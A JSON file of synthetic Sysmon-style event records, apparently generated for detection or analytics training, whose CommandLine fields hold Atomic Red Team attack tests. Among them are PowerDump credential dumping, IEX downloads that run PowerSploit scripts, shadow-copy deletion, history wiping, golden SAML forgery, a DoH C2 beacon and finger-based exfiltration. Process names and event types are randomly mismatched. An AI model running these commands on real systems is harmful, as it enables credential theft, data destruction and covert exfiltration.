[
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "laptop-07.coleman-farley.com",
        "User": "gardnerlisa",
        "ProcessID": 7591,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Write-Host \\\"STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON\\\" -fore green\\nImport-Module \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\PowerDump.ps1\\\"\\nInvoke-PowerDump\",",
        "LogonID": 239910,
        "LogonGuid": "aac48b0a-3bbd-4511-8b36-8320328c6c08",
        "SourceProcessID": 8765,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\campaign..dll",
        "DestinationProcessID": 4798,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\contain..exe",
        "UtcTime": "2024-05-17T01:36:51.568345Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "srv-97.peterson.info",
        "User": "richardmitchell",
        "ProcessID": 3688,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"# Import the required test harness function, Invoke-BuildAndInvokeInstallUtilAssembly\\n. \\\"#{test_harness}\\\"\\n\\n$InstallerAssemblyDir = \\\"#{assembly_dir}\\\"\\n$InstallerAssemblyFileName = \\\"#{assembly_filename}\\\"\\n$InstallerAssemblyFullPath = Join-Path -Path $InstallerAssemblyDir -ChildPath $InstallerAssemblyFileName\\n\\n$ExpectedOutput = 'Constructor_'\\n\\n$TestArgs = @{\\n    OutputAssemblyDirectory = $InstallerAssemblyDir\\n    OutputAssemblyFileName = $InstallerAssemblyFileName\\n    InvocationMethod = '#{invocation_method}'\\n}\\n\\n$ActualOutput = Invoke-BuildAndInvokeInstallUtilAssembly @TestArgs -MinimumViableAssembly\\n\\nif ($ActualOutput -ne $ExpectedOutput) {\\n    throw @\\\"\\nCheckIfInstallable method execution test failure. Installer assembly execution output did not match the expected output.\\nExpected: $ExpectedOutput\\nActual: $ActualOutput\\n\\\"@\\n}\\n\",",
        "LogonID": 573375,
        "LogonGuid": "b850136d-8a30-4ea3-8089-7a4b6a5de9a9",
        "SourceProcessID": 5796,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\standard..exe",
        "DestinationProcessID": 5902,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Windows\\reveal..exe",
        "UtcTime": "2024-05-17T01:36:51.569345Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-16.wilson.net",
        "User": "beth15",
        "ProcessID": 2192,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"wmic /node:\\\"#{target_host}\\\" process call create \\\"cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}\\\"\\n\",",
        "LogonID": 399394,
        "LogonGuid": "318b3b83-7192-469d-99c5-f3a35ef5f48b",
        "SourceProcessID": 4231,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\put..dll",
        "DestinationProcessID": 7033,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Users\\Public\\small..exe",
        "UtcTime": "2024-05-17T01:36:51.569345Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-40.gregory.com",
        "User": "dburke",
        "ProcessID": 1176,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"copy C:\\\\Windows\\\\System32\\\\cmd.exe C:\\\\svchost.exe\\nC:\\\\svchost.exe /c echo T1105 > \\\\\\\\localhost\\\\c$\\\\T1105.txt\\n\",",
        "LogonID": 799297,
        "LogonGuid": "b082c0c6-8921-4e9e-a4a7-84457a995962",
        "SourceProcessID": 1147,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\coach..dll",
        "DestinationProcessID": 5296,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\reality..exe",
        "UtcTime": "2024-05-17T01:36:51.569345Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-60.bond.com",
        "User": "nicolebailey",
        "ProcessID": 3455,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"net user #{guest_user} /active:yes\\n\",",
        "LogonID": 432743,
        "LogonGuid": "b1613053-b488-4233-9cc7-29b290f0ff20",
        "SourceProcessID": 1877,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\need..dll",
        "DestinationProcessID": 2170,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\would..exe",
        "UtcTime": "2024-05-17T01:36:51.569345Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-55.jones.net",
        "User": "michael34",
        "ProcessID": 1691,
        "ProcessName": "nc.exe",
        "CommandLine": "\"#{compiled_file} /tmp/ T1222002\\n\",",
        "LogonID": 371957,
        "LogonGuid": "b84cf478-fa7a-4ae1-ad1d-7c15c269c115",
        "SourceProcessID": 5606,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\it..dll",
        "DestinationProcessID": 1712,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\recent..exe",
        "UtcTime": "2024-05-17T01:36:51.570344Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-92.parker-bell.com",
        "User": "vsilva",
        "ProcessID": 3537,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"New-WebGlobalModule -Name #{module_name} -Image #{dll_path}\\n\",",
        "LogonID": 335721,
        "LogonGuid": "fae27712-7807-4cf0-bc73-016fb617458f",
        "SourceProcessID": 7842,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\western..dll",
        "DestinationProcessID": 2223,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\cell..exe",
        "UtcTime": "2024-05-17T01:36:51.570344Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "lt-27.brown-johnson.net",
        "User": "joseph57",
        "ProcessID": 3479,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"\\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\AdFind.exe\\\" #{optional_args} -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties\\n\",",
        "LogonID": 343914,
        "LogonGuid": "9165c713-1b98-4d2d-9a21-164e11a3a8d5",
        "SourceProcessID": 9798,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Users\\Public\\safe..exe",
        "DestinationProcessID": 8951,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Windows\\wide..exe",
        "UtcTime": "2024-05-17T01:36:51.570344Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-83.wright.com",
        "User": "ramseymonica",
        "ProcessID": 8411,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"vssadmin.exe delete shadows /all /quiet\\n\",",
        "LogonID": 784608,
        "LogonGuid": "34e87dad-6e2d-4586-a7c7-913e134c87dc",
        "SourceProcessID": 5589,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\manage..dll",
        "DestinationProcessID": 1008,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\reality..exe",
        "UtcTime": "2024-05-17T01:36:51.570344Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-88.nielsen-wells.com",
        "User": "williamgrant",
        "ProcessID": 3502,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"#{soaphound_path} --user $(#{user})@$(#{domain}) --password #{password} --dc #{dc} --buildcache --cachefilename #{cachefilename}\\n\",",
        "LogonID": 150844,
        "LogonGuid": "dd40a89f-db89-439a-8622-0bc27e0f12ed",
        "SourceProcessID": 3163,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\leg..dll",
        "DestinationProcessID": 6273,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\hot..dll",
        "UtcTime": "2024-05-17T01:36:51.570344Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-71.underwood-brown.com",
        "User": "myoung",
        "ProcessID": 6893,
        "ProcessName": "nc.exe",
        "CommandLine": "\"sudo #{compiled_file} #{source_file}\\n\",",
        "LogonID": 954804,
        "LogonGuid": "3806ab92-051b-441e-b712-9ef4b32cde0f",
        "SourceProcessID": 5162,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\agency..dll",
        "DestinationProcessID": 5087,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Windows\\citizen..exe",
        "UtcTime": "2024-05-17T01:36:51.571345Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-42.adkins.com",
        "User": "villarrealshannon",
        "ProcessID": 8888,
        "ProcessName": "malware.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-ForestTrust -Verbose\\n\",",
        "LogonID": 226941,
        "LogonGuid": "68eca639-eae4-40d0-8d01-48e2309abf31",
        "SourceProcessID": 3126,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\month..exe",
        "DestinationProcessID": 8359,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\guy..exe",
        "UtcTime": "2024-05-17T01:36:51.571345Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-19.cook.info",
        "User": "samantha64",
        "ProcessID": 3803,
        "ProcessName": "malware.exe",
        "CommandLine": "\"#{regsvr32path}\\\\#{regsvr32name} /s /i \\\"#{dll_name}\\\"\\n\",",
        "LogonID": 415838,
        "LogonGuid": "6db20a4f-24d6-4e3a-bd0a-aa00d09b7e69",
        "SourceProcessID": 5148,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\can..exe",
        "DestinationProcessID": 9609,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\role..exe",
        "UtcTime": "2024-05-17T01:36:51.571345Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-26.riley.com",
        "User": "acostaalexander",
        "ProcessID": 2381,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}\\n\",",
        "LogonID": 640687,
        "LogonGuid": "f74e0f6c-eaa2-4948-b4f4-e5b1f846c627",
        "SourceProcessID": 7411,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Windows\\raise..exe",
        "DestinationProcessID": 5311,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\ever..exe",
        "UtcTime": "2024-05-17T01:36:51.571345Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-74.ortiz-coleman.org",
        "User": "coleanthony",
        "ProcessID": 6369,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"bcdedit /set testsigning on\",",
        "LogonID": 243890,
        "LogonGuid": "5c7d7a65-f717-4a50-bb31-4b1342ec95df",
        "SourceProcessID": 1125,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\program..exe",
        "DestinationProcessID": 9453,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\reason..exe",
        "UtcTime": "2024-05-17T01:36:51.571345Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-63.stephenson-howard.com",
        "User": "sgray",
        "ProcessID": 8412,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\niex(iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/d943001a7defb5e0d1657085a77a0e78609be58f/Privesc/PowerUp.ps1 -UseBasicParsing)\\nInvoke-AllChecks\\n\",",
        "LogonID": 217563,
        "LogonGuid": "c53e7859-d867-4b0f-8ced-ac244a99c793",
        "SourceProcessID": 6576,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Users\\Public\\old..exe",
        "DestinationProcessID": 9052,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Program Files\\Democrat..dll",
        "UtcTime": "2024-05-17T01:36:51.571345Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-84.harris.com",
        "User": "flee",
        "ProcessID": 6468,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"osascript -e 'tell application \\\"Terminal\\\" to do script \\\"tor\\\"'\\n\",",
        "LogonID": 943809,
        "LogonGuid": "fbe75fc3-99b2-4f43-b7b7-8af37a861cf7",
        "SourceProcessID": 1878,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\run..dll",
        "DestinationProcessID": 5950,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\including..exe",
        "UtcTime": "2024-05-17T01:36:51.571345Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "db-91.chavez.com",
        "User": "zhunter",
        "ProcessID": 8304,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"cp $HISTFILE $HISTFILE.OLD\\nif ((${#HISTFILE[@]})); then echo $HISTFILE; fi\\necho \\\"\\\" > $HISTFILE\\nif [ $(wc -c <$HISTFILE) -gt 1 ]; then echo \\\"$HISTFILE is larger than 1k\\\"; fi\\nls -la $HISTFILE \\ncat $HISTFILE\\nhistory -c \\nif [ $(history |wc -l) -eq 1 ]; then echo \\\"History cache cleared\\\"; fi\\n\",",
        "LogonID": 563145,
        "LogonGuid": "c9118817-3d11-4615-ba24-4565d578a32e",
        "SourceProcessID": 9091,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\major..exe",
        "DestinationProcessID": 2635,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\benefit..exe",
        "UtcTime": "2024-05-17T01:36:51.571345Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-84.morgan-robbins.com",
        "User": "rlee",
        "ProcessID": 4215,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"start \\\"\\\" #{browser} --headless --disable-gpu https://mockbin.org/bin/#{bin_id}\\n\",",
        "LogonID": 590582,
        "LogonGuid": "b44928db-0ac4-440f-bfa9-0e55e42c5999",
        "SourceProcessID": 6622,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\nearly..exe",
        "DestinationProcessID": 9471,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\maintain..exe",
        "UtcTime": "2024-05-17T01:36:51.572801Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "web-64.davis.com",
        "User": "ohebert",
        "ProcessID": 5745,
        "ProcessName": "nc.exe",
        "CommandLine": "\"find /usr/bin -perm -4000\\n\",",
        "LogonID": 365735,
        "LogonGuid": "34543b51-a83e-4087-a743-5469f76c3a91",
        "SourceProcessID": 1914,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\no..exe",
        "DestinationProcessID": 8976,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\around..dll",
        "UtcTime": "2024-05-17T01:36:51.572801Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "laptop-71.jacobs.com",
        "User": "kbowen",
        "ProcessID": 4558,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"rundll32.exe url.dll,OpenURL \\\"PathToAtomicsFolder\\\\T1218.011\\\\src\\\\index.hta\\\"\\nrundll32.exe URL.dll,FileProtocolHandler \\\"PathToAtomicsFolder\\\\T1218.011\\\\src\\\\akteullen.vbs\\\"\\n\",",
        "LogonID": 674152,
        "LogonGuid": "7656cc26-cdfe-49f6-a20f-9de763a8ea90",
        "SourceProcessID": 4449,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\finally..dll",
        "DestinationProcessID": 4990,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\with..dll",
        "UtcTime": "2024-05-17T01:36:51.572801Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-56.gonzalez.org",
        "User": "bcarlson",
        "ProcessID": 7145,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"uname -a >> #{output_file}\\nif [ -f /etc/lsb-release ]; then cat /etc/lsb-release >> #{output_file}; fi\\nif [ -f /etc/redhat-release ]; then cat /etc/redhat-release >> #{output_file}; fi   \\nif [ -f /etc/issue ]; then cat /etc/issue >> #{output_file}; fi\\nif [ -f /etc/os-release ]; then cat /etc/os-release >> #{output_file}; fi\\nuptime >> #{output_file}\\ncat #{output_file} 2>/dev/null\\n\",",
        "LogonID": 989155,
        "LogonGuid": "6c9518c9-752d-4bfe-8b12-bea417e552d4",
        "SourceProcessID": 6378,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\produce..exe",
        "DestinationProcessID": 7213,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\left..exe",
        "UtcTime": "2024-05-17T01:36:51.572801Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "srv-26.reid-russell.info",
        "User": "gsalinas",
        "ProcessID": 5326,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"rundll32.exe #{dll_file},krnl\\n\",",
        "LogonID": 607290,
        "LogonGuid": "36978c14-1e56-4cdd-af4f-ca3696b0222f",
        "SourceProcessID": 9015,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\fly..exe",
        "DestinationProcessID": 7613,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\agency..exe",
        "UtcTime": "2024-05-17T01:36:51.572801Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-69.soto.com",
        "User": "bethanyjames",
        "ProcessID": 2247,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"NET USE * '#{remote_path}' /TRANSPORT:QUIC /SKIPCERTCHECK\\ncopy '#{local_file}' '*:\\\\'\\n\",",
        "LogonID": 101201,
        "LogonGuid": "dae95ae6-0066-40a9-8432-68c57ccd8962",
        "SourceProcessID": 7545,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\list..dll",
        "DestinationProcessID": 3568,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\onto..exe",
        "UtcTime": "2024-05-17T01:36:51.573799Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-62.moore.com",
        "User": "josegarcia",
        "ProcessID": 2430,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"wmic process get caption,executablepath,commandline /format:csv\\n\",",
        "LogonID": 790021,
        "LogonGuid": "381cfb2f-85bb-4fba-a408-aefc79dd2013",
        "SourceProcessID": 7105,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\all..dll",
        "DestinationProcessID": 2295,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\shoulder..dll",
        "UtcTime": "2024-05-17T01:36:51.573799Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-18.jones-martinez.biz",
        "User": "jamesbooth",
        "ProcessID": 6702,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"reg add \\\"HKEY_LOCAL_MACHINE\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\Terminal Services\\\" /v \\\"DisableRemoteDesktopAntiAlias\\\" /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 547223,
        "LogonGuid": "c64ec8f4-67bb-4b61-a52b-dc6ab6428d7a",
        "SourceProcessID": 9403,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\pay..dll",
        "DestinationProcessID": 6109,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\believe..exe",
        "UtcTime": "2024-05-17T01:36:51.573799Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "web-16.tapia-moore.org",
        "User": "blewis",
        "ProcessID": 7301,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"finger base64_filedata@#{remote_host}\\n\",",
        "LogonID": 638776,
        "LogonGuid": "bb6eb7b6-d458-4fcd-8021-b9d677dcd64f",
        "SourceProcessID": 5173,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\federal..exe",
        "DestinationProcessID": 5250,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Users\\Public\\material..dll",
        "UtcTime": "2024-05-17T01:36:51.573799Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-12.beltran.com",
        "User": "clementsstephen",
        "ProcessID": 3859,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"Set-Location \\\"PathToAtomicsFolder\\\"\\n.\\\\T1572\\\\src\\\\T1572-doh-beacon.ps1 -DohServer #{doh_server} -Domain #{domain} -Subdomain #{subdomain} -QueryType #{query_type} -C2Interval #{c2_interval} -C2Jitter #{c2_jitter} -RunTime #{runtime}\\n\",",
        "LogonID": 859954,
        "LogonGuid": "570572b7-bd29-4c7f-bfab-f5f35031c9ce",
        "SourceProcessID": 6159,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\recognize..dll",
        "DestinationProcessID": 3155,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\receive..exe",
        "UtcTime": "2024-05-17T01:36:51.573799Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-59.williams-collins.com",
        "User": "leonard20",
        "ProcessID": 7437,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"bash -c 'trap \\\"nohup sh $PathToAtomicsFolder/T1546.005/src/echo-art-fish.sh\\\" SIGINT && kill -SIGINT $$'\\n\",",
        "LogonID": 282729,
        "LogonGuid": "5cdc7ff6-a3c8-4f26-a98d-9bcc10f47c68",
        "SourceProcessID": 7001,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Windows\\lawyer..exe",
        "DestinationProcessID": 7998,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Windows\\manage..exe",
        "UtcTime": "2024-05-17T01:36:51.574798Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-51.hill.info",
        "User": "katelyn78",
        "ProcessID": 1432,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"net.exe stop #{service_name}\\n\",",
        "LogonID": 637553,
        "LogonGuid": "590e129e-130b-459a-a2c5-a297944ed4c6",
        "SourceProcessID": 2249,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Windows\\building..exe",
        "DestinationProcessID": 9791,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Users\\Public\\operation..dll",
        "UtcTime": "2024-05-17T01:36:51.574798Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "email-21.hall.com",
        "User": "hinessarah",
        "ProcessID": 1222,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"sc sdset VSS D:(D;;GA;;;NU)(D;;GA;;;WD)(D;;GA;;;AN)S:(AU;FA;GA;;;WD)(AU;OIIOFA;GA;;;WD)\\n\",",
        "LogonID": 151092,
        "LogonGuid": "12bf95ad-3eff-4f2b-864b-19e83c17762f",
        "SourceProcessID": 4078,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Windows\\heart..exe",
        "DestinationProcessID": 8111,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\Republican..exe",
        "UtcTime": "2024-05-17T01:36:51.574798Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "email-40.monroe.com",
        "User": "hopkinsnicholas",
        "ProcessID": 6943,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"security import #{cert_export} -k\\n\",",
        "LogonID": 231910,
        "LogonGuid": "3aa9153b-9504-4b28-8b1c-45eb9ca2db6a",
        "SourceProcessID": 2366,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\necessary..dll",
        "DestinationProcessID": 8109,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Users\\Public\\from..exe",
        "UtcTime": "2024-05-17T01:36:51.574798Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "srv-39.anderson-taylor.com",
        "User": "shawcharles",
        "ProcessID": 2796,
        "ProcessName": "malware.exe",
        "CommandLine": "\"Import-Module AADInternals -Force\\n$saml = New-AADIntSAMLToken -ImmutableID \\\"#{immutable_id}\\\" -PfxFileName \\\"#{certificate_path}\\\" -Issuer \\\"#{issuer_uri}\\\"\\n$conn = Get-AADIntAccessTokenForAADGraph -SAMLToken $saml -SaveToCache\\nif ($conn) { Write-Host \\\"`nSuccessfully connected as $($conn.User)\\\" } else { Write-Host \\\"`nThe connection failed\\\" }\\nWrite-Host \\\"End of Golden SAML\\\"\\n\",",
        "LogonID": 522341,
        "LogonGuid": "ef62d561-2af5-47c0-961d-2003fdc0c895",
        "SourceProcessID": 1581,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\send..exe",
        "DestinationProcessID": 4609,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\while..dll",
        "UtcTime": "2024-05-17T01:36:51.574798Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "lt-15.reyes-rodriguez.com",
        "User": "mware",
        "ProcessID": 1293,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"REG ADD \\\"HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\SafeBoot\\\\Network\\\\AtomicSafeMode\\\" /VE /T REG_SZ /F /D \\\"Service\\\"\\n\",",
        "LogonID": 391476,
        "LogonGuid": "4c74eec3-c9b2-4112-a4f5-da3cc2a2d7d0",
        "SourceProcessID": 3902,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Users\\Public\\learn..exe",
        "DestinationProcessID": 7495,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\air..exe",
        "UtcTime": "2024-05-17T01:36:51.575799Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-87.pennington-bowers.net",
        "User": "vcross",
        "ProcessID": 7502,
        "ProcessName": "nc.exe",
        "CommandLine": "\"mkdir -p #{test_folder}\\ncd #{test_folder}; touch a b c d e f g\\nzip --password \\\"#{encryption_password}\\\" #{test_folder}/#{test_file} ./*\\necho \\\"#{encryption_password}\\\" | gpg --batch --yes --passphrase-fd 0 --output #{test_folder}/#{test_file}.zip.gpg -c #{test_folder}/#{test_file}.zip\\nls -l #{test_folder}\\n\",",
        "LogonID": 329222,
        "LogonGuid": "271d7f98-f622-4df1-bdbf-ae8c3be93377",
        "SourceProcessID": 7356,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Program Files\\party..exe",
        "DestinationProcessID": 3075,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\research..dll",
        "UtcTime": "2024-05-17T01:36:51.575799Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-48.scott-hansen.biz",
        "User": "ujohnson",
        "ProcessID": 5309,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\\"PathToAtomicsFolder\\\\T1070.001\\\\src\\\\T1070.001-macrocode.txt\\\" -officeProduct \\\"Word\\\" -sub \\\"ClearLogs\\\"\\n\",",
        "LogonID": 547545,
        "LogonGuid": "748ef662-a7d4-4ae4-afd4-64e702b51601",
        "SourceProcessID": 3443,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Program Files\\happen..exe",
        "DestinationProcessID": 4615,
        "DestinationProcessName": "taskmgr.exe",
        "DestinationImage": "C:\\Program Files\\edge..dll",
        "UtcTime": "2024-05-17T01:36:51.575799Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "email-97.romero.com",
        "User": "ywebster",
        "ProcessID": 2330,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"tasklist.exe\\nsc query\\nsc query state= all\\n\",",
        "LogonID": 178107,
        "LogonGuid": "0f650d94-57e1-430d-b5d7-1b5b031a0bac",
        "SourceProcessID": 8850,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Program Files\\medical..dll",
        "DestinationProcessID": 3186,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\question..dll",
